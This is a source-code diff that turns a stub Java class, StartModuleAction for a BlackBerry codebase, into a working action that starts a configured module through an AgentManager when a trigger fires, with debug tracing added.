@@ -1,22 +1,44 @@
 package blackberry.action;
 
+import blackberry.AgentManager;
+import blackberry.Trigger;
 import blackberry.config.ConfAction;
-import blackberry.event.Event;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
 
-public class StartModuleAction extends SubAction {
+public final class StartModuleAction extends ModuleAction {
 
-    public StartModuleAction(ConfAction params) {
-        // TODO Auto-generated constructor stub
+    //#ifdef DEBUG
+    static Debug debug = new Debug("StartModuleAction", DebugLevel.VERBOSE);
+    //#endif
+
+    /**
+     * Instantiates a new start agent action.
+     * 
+     * @param params
+     *            the conf params
+     */
+    public StartModuleAction(final ConfAction params) {
+        super(params);
     }
 
-    public boolean execute(Event event) {
-        // TODO Auto-generated method stub
-        return false;
+    /*
+     * (non-Javadoc)
+     * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
+     */
+    public boolean execute(Trigger trigger) {
+        //#ifdef DEBUG
+        debug.trace("execute");
+        //#endif
+
+        final AgentManager agentManager = AgentManager.getInstance();
+        agentManager.start(moduleId);
+        return true;
     }
 
-    protected boolean parse(byte[] confParams) {
-        // TODO Auto-generated method stub
-        return false;
+    //#ifdef DEBUG
+    public String toString() {
+        return "Start " + moduleId;
     }
-
+    //#endif
 }
